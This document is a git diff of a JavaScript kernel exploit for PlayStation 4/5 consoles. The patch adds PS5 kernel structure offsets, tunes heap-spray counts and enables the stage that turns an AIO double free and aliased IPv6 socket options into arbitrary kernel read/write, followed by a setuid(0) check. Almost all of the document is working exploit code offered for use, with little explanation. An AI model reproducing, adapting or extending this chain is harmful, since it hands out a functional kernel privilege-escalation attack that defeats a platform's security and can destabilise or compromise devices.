@@ -117,6 +117,55 @@ const fw_config = (() => {
   throw new RangeError(`unsupported: console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
 })();
 
+const kernel_offsets = (() => {
+  const k_offsets = fw_config.kernel_offsets;
+  const specific_offsets = is_ps4 ? {
+    // proc structure
+    proc_fd: 0x48,
+    proc_pid: 0xb0,
+    proc_vm_space: 0x200,
+    proc_comm: -1,
+    proc_sysent: -1,
+    // filedesc
+    filedesc_ofiles: 0x0,
+    sizeof_ofiles: 0x8,
+    // vmspace structure
+    vmspace_vm_pmap: -1,
+    vmspace_vm_vmid: -1,
+    // pmap structure
+    pmap_cr3: 0x28,
+    // net
+    so_pcb: 0x18,
+    inpcb_pktopts: 0x118,
+  } : {
+    // proc structure
+    proc_fd: 0x48,
+    proc_pid: 0xbc,
+    proc_vm_space: 0x200,
+    proc_comm: -1,
+    proc_sysent: -1,
+    // filedesc
+    filedesc_ofiles: 0x8,
+    sizeof_ofiles: 0x30,
+    // vmspace structure
+    vmspace_vm_pmap: -1,
+    vmspace_vm_vmid: -1,
+    // pmap structure
+    pmap_cr3: 0x28,
+    // net
+    so_pcb: 0x18,
+    inpcb_pktopts: 0x120,
+    // ps5 specific offsets
+    data_base_target_id: k_offsets.data_base_security_flags + 0x09,
+    data_base_qa_flags: k_offsets.data_base_security_flags + 0x24,
+    data_base_utoken_flags: k_offsets.data_base_security_flags + 0x8C
+  }
+  return {
+    ...k_offsets,
+    ...specific_offsets
+  }
+})();
+
 const pthread_offsets = fw_config.pthread_offsets;
 const off_kstr = fw_config.off_kstr;
 const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
@@ -204,8 +253,8 @@ const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);
 const main_core = is_ps4 ? 7 : 11;
 const num_grooms = 0x200;
 const num_handles = 0x100;
-const num_sds = 0x40; // max is 0x100 due to max IPV6_TCLASS
-const num_sds_alt = 0x30;
+const num_sds = 0x60; // max is 0x100 due to max IPV6_TCLASS
+const num_sds_alt = 0x40;
 const num_alias = 100;
 const num_races = 100;
 const leak_len = 16;
@@ -506,13 +555,13 @@ function free_rthdrs(sds) {
 }
 
 function build_rthdr(buf, size) {
-  const len = ((size >>> 3) - 1) & ~1;
+  const len = ((size >> 3) - 1) & ~1;
   size = (len + 1) << 3;
 
   buf[0] = 0;
   buf[1] = len;
   buf[2] = 0;
-  buf[3] = len >>> 1;
+  buf[3] = len >> 1;
 
   return size;
 }
@@ -613,7 +662,7 @@ function make_aliased_rthdrs(sds) {
 function race_one(request_addr, tcp_sd, barrier, racer, sds) {
   const sce_errs = new View4([-1, -1]);
   const thr_mask = new Word(1 << main_core);
-  const setsize = is_ps4 ? 8 : 0x10;
+  const setsize = 0x10;
 
   const thr = racer;
   thr.push_syscall("cpuset_setaffinity", CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, setsize, thr_mask.addr);
@@ -728,7 +777,7 @@ function double_free_reqs2(sds) {
 
   const server_addr = new Buffer(16);
   // sockaddr_in.sin_family
-  server_addr[1] = AF_INET;
+  server_addr.write8(1, AF_INET);
   // sockaddr_in.sin_port
   server_addr.write16(2, htons(5050));
   // sockaddr_in.sin_addr = 127.0.0.1
@@ -739,7 +788,9 @@ function double_free_reqs2(sds) {
   call_nze("pthread_barrier_init", barrier.addr, 0, 2);
 
   const sd_listen = new_tcp_socket();
-  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1), 4);
+  const enable = new Buffer(4);
+  enable.write32(0, 1);
+  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);
 
   sysi("bind", sd_listen, server_addr.addr, server_addr.size);
   sysi("listen", sd_listen, 1);
@@ -1033,7 +1084,7 @@ function leak_kernel_addrs(sd_pair, sds) {
   const aio_info_addr = buf.read64(reqs2_off + 0x18);
 
   const reqs1_addr = new Long(buf.read64(reqs2_off + 0x10));
-  reqs1_addr.lo &= -0xff;
+  reqs1_addr.lo &= ~0xff;
 
   const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off).add(reqs3_offset);
 
@@ -1084,7 +1135,7 @@ function make_aliased_pktopts(sds) {
   const tclass = new Buffer(4);
   for (let loop = 0; loop < num_alias; loop++) {
 
-    for (let i = 0; i < num_sds; i++) {
+    for (let i = 0; i < sds.length; i++) {
       tclass.write32(0, i);
       ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
     }
@@ -1110,7 +1161,7 @@ function make_aliased_pktopts(sds) {
       }
 
     }
-    for (let i = 0; i < num_sds; i++) {
+    for (let i = 0; i < sds.length; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
   }
@@ -1137,7 +1188,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
   for (let i = 0; i < num_clobbers; i++) {
     spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
 
-    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
+    if ((get_rthdr(sd, buf, max_leak_len) === 8) && (buf.read32(0) === AIO_CMD_READ)) {
       log(`aliased at attempt: ${i}`);
       aio_not_found = false;
       cancel_aios(aio_ids_p, aio_ids_len);
@@ -1177,10 +1228,18 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     }
 
     for (let batch = 0; batch < addr_cache.length; batch++) {
-      states.fill(-1);
+      for (let j = 0; j < num_elems; j++) {
+        states[j] = -1;
+      }
       aio_multi_cancel(addr_cache[batch], num_elems, states_p);
 
-      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
+      let req_idx = -1;
+      for (let j = 0; j < num_elems; j++) {
+        const val = states[j];
+        if (val === AIO_STATE_COMPLETE) {
+          req_idx = j;
+        }
+      }
       if (req_idx !== -1) {
         log(`req_idx: ${req_idx}`);
         log(`found req_id at batch: ${batch}`);
@@ -1200,19 +1259,24 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
       }
     }
   }
-  if (req_id === null) {
+  if (!req_id) {
     log("FATAL: failed to overwrite AIO queue entry");
     die("failed to overwrite AIO queue entry");
   }
   free_aios2(aio_ids_p, aio_ids_len);
   log(`aios2 freed. target_ids: ${hex(req_id)}, ${hex(target_id)}`)
   // enable deletion of target_id
-  const target_id_p = new View4([target_id]);
+  const target_id_p = new Buffer(4);
+  target_id_p.write32(0, target_id);
   poll_aio(target_id_p, states, 1);
   log(`target's state: ${hex(states[0])}`);
 
-  const sce_errs = new View4([-1, -1]);
-  const target_ids = new View4([req_id, target_id]);
+  const sce_errs = new Buffer(8);
+  sce_errs.write32(0, -1);
+  sce_errs.write32(4, -1)
+  const target_ids = new Buffer(8);
+  target_ids.write32(0, req_id);
+  target_ids.write32(4, target_id);
   // PANIC: double free on the 0x100 malloc zone. important kernel data may
   // alias
   aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
@@ -1223,7 +1287,6 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
     // RESTORE: double freed memory has been reclaimed with harmless data
     // PANIC: 0x100 malloc zone pointers aliased
     const sd_pair = make_aliased_pktopts(sds_alt);
-    alert("done making pktopts");
     return sd_pair;
   } finally {
     log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
@@ -1258,7 +1321,7 @@ function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_re
 // k100_addr is double freed 0x100 malloc zone address
 // dirty_sd is the socket whose rthdr pointer is corrupt
 // kernel_addr is the address of the "evf cv" string
-function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
+function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
   const psd = pktopts_sds[0];
   const tclass = new Word();
   const off_tclass = is_ps4 ? 0xb0 : 0xc0;
@@ -1273,21 +1336,21 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   let reclaim_sd = null;
   close(pktopts_sds[1]);
   for (let i = 0; i < num_alias; i++) {
-    for (let i = 0; i < num_sds; i++) {
+    for (let i = 0; i < sds_alt.length; i++) {
       // if a socket doesn't have a pktopts, setting the rthdr will make
       // one. the new pktopts might reuse the memory instead of the
       // rthdr. make sure the sockets already have a pktopts before
       pktopts.write32(off_tclass, 0x4141 | (i << 16));
-      set_rthdr(sds[i], pktopts, rsize);
+      set_rthdr(sds_alt[i], pktopts, rsize);
     }
 
-    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
     const marker = tclass[0];
     if ((marker & 0xffff) === 0x4141) {
       log(`found reclaim sd at attempt: ${i}`);
       const idx = marker >>> 16;
-      reclaim_sd = sds[idx];
-      sds.splice(idx, 1);
+      reclaim_sd = sds_alt[idx];
+      sds_alt.splice(idx, 1);
       break;
     }
   }
@@ -1310,7 +1373,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
       pktinfo.write64(8, addr.add(offset));
       nhop[0] = len - offset;
 
-      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14);
       sysi("getsockopt", psd, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf_p.add(offset), nhop_p);
 
       const n = nhop[0];
@@ -1332,42 +1395,34 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     die('test read of &"evf cv" failed');
   }
 
-  const kbase = kernel_addr.sub(off_kstr);
-  log(`kernel base: ${kbase}`);
+  // possibly only needed for ps4
+  // const kbase = kernel_addr.sub(off_kstr);
+  // log(`kernel base: ${kbase}`);
 
+  alert("making arbitrary kernel read/write");
   log("\nmaking arbitrary kernel read/write");
-  const cpuid = 7 - main_core;
-  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
-  log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
-  const pcpu = kread64(pcpu_p);
-  log(`pcpu: ${pcpu}`);
-  log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
-  // __pcpu[cpuid].pc_curthread
-  const td = kread64(pcpu);
-  log(`td: ${td}`);
 
   const off_td_proc = 8;
-  const proc = kread64(td.add(off_td_proc));
+  const proc = kread64(aio_info_addr.add(off_td_proc));
   log(`proc: ${proc}`);
   const pid = sysi("getpid");
   log(`our pid: ${pid}`);
-  const pid2 = kread64(proc.add(0xb0)).lo;
-  log(`suspected proc pid: ${pid2}`);
-  if (pid2 !== pid) {
+  const pid2 = kread64(proc.add(kernel_offsets.proc_pid));
+  log(`suspected proc pid: ${pid2} .lo: ${pid2.lo}`);
+  if (pid2.lo !== pid) {
     log("FATAL: process not found");
     die("process not found");
   }
 
-  const off_p_fd = 0x48;
-  const p_fd = kread64(proc.add(off_p_fd));
+  alert("Process found!");
+
+  const p_fd = kread64(proc.add(kernel_offsets.proc_fd));
   log(`proc.p_fd: ${p_fd}`);
   // curthread->td_proc->p_fd->fd_ofiles
   const ofiles = kread64(p_fd);
   log(`ofiles: ${ofiles}`);
 
-  const off_p_ucred = 0x40;
-  const p_ucred = kread64(proc.add(off_p_ucred));
-  log(`p_ucred ${p_ucred}`);
+  alert(`ofiles: ${ofiles}`);
 
   const pipes = new View4(2);
   sysi("pipe", pipes.addr);
@@ -1377,13 +1432,17 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const kpipe = kread64(pipe_file);
   log(`pipe pointer: ${kpipe}`);
 
+  alert(`pipe pointer: ${kpipe}`);
+
   const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
   for (let off = 0; off < pipe_save.size; off += 8) {
     pipe_save.write64(off, kread64(kpipe.add(off)));
   }
 
+  alert("Before new_socket()");
+
   const main_sd = psd;
-  const worker_sd = dirty_sd;
+  const worker_sd = new_socket();
 
   const main_file = kread64(ofiles.add(main_sd * 8));
   log(`main sock file: ${main_file}`);
@@ -1391,10 +1450,10 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   const main_sock = kread64(main_file);
   log(`main sock pointer: ${main_sock}`);
   // socket.so_pcb (struct inpcb *)
-  const m_pcb = kread64(main_sock.add(0x18));
+  const m_pcb = kread64(main_sock.add(kernel_offsets.so_pcb));
   log(`main sock pcb: ${m_pcb}`);
   // inpcb.in6p_outputopts
-  const m_pktopts = kread64(m_pcb.add(0x118));
+  const m_pktopts = kread64(m_pcb.add(kernel_offsets.inpcb_pktopts));
   log(`main pktopts: ${m_pktopts}`);
   log(`0x100 malloc zone pointer: ${k100_addr}`);
 
@@ -1403,24 +1462,25 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     die("main pktopts pointer != leaked pktopts pointer");
   }
 
+  alert('About to do socket shennanigans');
   // ofiles[sd].f_data
   const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
   log(`reclaim sock pointer: ${reclaim_sock}`);
   // socket.so_pcb (struct inpcb *)
-  const r_pcb = kread64(reclaim_sock.add(0x18));
+  const r_pcb = kread64(reclaim_sock.add(kernel_offsets.so_pcb));
   log(`reclaim sock pcb: ${r_pcb}`);
   // inpcb.in6p_outputopts
-  const r_pktopts = kread64(r_pcb.add(0x118));
+  const r_pktopts = kread64(r_pcb.add(kernel_offsets.inpcb_pktopts));
   log(`reclaim pktopts: ${r_pktopts}`);
 
   // ofiles[sd].f_data
   const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
   log(`worker sock pointer: ${worker_sock}`);
   // socket.so_pcb (struct inpcb *)
-  const w_pcb = kread64(worker_sock.add(0x18));
+  const w_pcb = kread64(worker_sock.add(kernel_offsets.so_pcb));
   log(`worker sock pcb: ${w_pcb}`);
   // inpcb.in6p_outputopts
-  const w_pktopts = kread64(w_pcb.add(0x118));
+  const w_pktopts = kread64(w_pcb.add(kernel_offsets.inpcb_pktopts));
   log(`worker pktopts: ${w_pktopts}`);
 
   // get restricted read/write with pktopts pair
@@ -1440,6 +1500,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     die("pktopts read failed");
   }
   log("achieved restricted kernel read/write");
+  alert("achieved restricted kernel read/write");
 
   // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
   // using pktopts write. we can safely modify a pipe even with this limit so
@@ -1558,6 +1619,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
   }
   const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
+  alert('Got kmem done!');
 
   const kstr3_buf = new Buffer(8);
   kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
@@ -1578,7 +1640,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
   kmem.write64(w_rthdr_p, 0);
   log("corrupt pointers cleaned");
 
-  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
+  return [kmem, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
 // FUNCTIONS FOR STAGE: PATCH KERNEL
@@ -1755,16 +1817,16 @@ export async function kexploit() {
   await init();
   const _init_t2 = performance.now();
 
-  // If setuid is successful, we dont need to run the kernel exploit again
-  try {
-    if (sysi("setuid", 0) == 0) {
-      log(`Attempting setuid: ${sysi("setuid", 0)}`)
-      log("kernel already patched, skipping kexploit");
-      return true;
-    }
-  } catch {
-    // Expected when not in an exploited state
-  }
+  // // If setuid is successful, we dont need to run the kernel exploit again
+  // try {
+  //   if (sysi("setuid", 0) == 0) {
+  //     log(`Attempting setuid: ${sysi("setuid", 0)}`)
+  //     log("kernel already patched, skipping kexploit");
+  //     return true;
+  //   }
+  // } catch {
+  //   // Expected when not in an exploited state
+  // }
 
   // Get current core/rtprio
   const current_core = get_current_core();
@@ -1821,12 +1883,12 @@ export async function kexploit() {
 
     log("\nSTAGE: Double free SceKernelAioRWRequest");
     const pktopts_sds = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[0], sds, sds_alt, fake_reqs3_addr);
-    alert('double free success');
+    alert('double free SceKernelAioRWRequest success');
 
     log("\nSTAGE: Get arbitrary kernel read/write");
-    log("Pending Kernel ARW");
-    // const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds);
-    // alert('Got kernel arw');
+    const [kmem, restore_info] = make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr);
+    alert('Got kernel arw');
+    log("achieved kernel arw! kbase");
 
     log("\nSTAGE: Patch kernel");
     log("PS5 kernel patches pending.");
@@ -1842,32 +1904,32 @@ export async function kexploit() {
     log(`time - init time: ${(ftime - init_time) / 1000}`);
 
     // Cleaning up
-    if (block_fd !== undefined && block_fd !== null) {
-      close(block_fd);
-    }
     if (unblock_fd !== undefined && unblock_fd !== null) {
       close(unblock_fd);
     }
-    if (groom_ids) {
-      free_aios2(groom_ids.addr, num_grooms);
-    }
-    if (block_id) {
-      aio_multi_wait(block_id.addr, 1);
-      aio_multi_delete(block_id.addr, 1);
-    }
-    for (const sd of sds) {
-      close(sd);
-    }
-    for (const sd_alt of sds_alt) {
-      close(sd_alt);
-    }
-
-    // Restore core/rtprio
-    log(`restoring core: ${current_core}`);
-    log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
-    pin_to_core(current_core);
-    set_rtprio(current_rtprio);
   }
+  if (block_fd !== undefined && block_fd !== null) {
+    close(block_fd);
+  }
+  if (groom_ids) {
+    free_aios2(groom_ids.addr, num_grooms);
+  }
+  if (block_id) {
+    aio_multi_wait(block_id.addr, 1);
+    aio_multi_delete(block_id.addr, 1);
+  }
+  for (const sd of sds) {
+    close(sd);
+  }
+  for (const sd_alt of sds_alt) {
+    close(sd_alt);
+  }
+
+  // Restore core/rtprio
+  log(`restoring core: ${current_core}`);
+  log(`restoring rtprio: type=${current_rtprio.type} prio=${current_rtprio.prio}`);
+  pin_to_core(current_core);
+  set_rtprio(current_rtprio);
 
   // Check if it all worked
   log("setuid(0)");
@@ -2052,6 +2114,6 @@ function runPayload(path) {
 kexploit().then((success) => {
   if (success) {
     // runPayload("./payload.bin");
-    runBinLoader();
+    // runBinLoader();
   }
 });
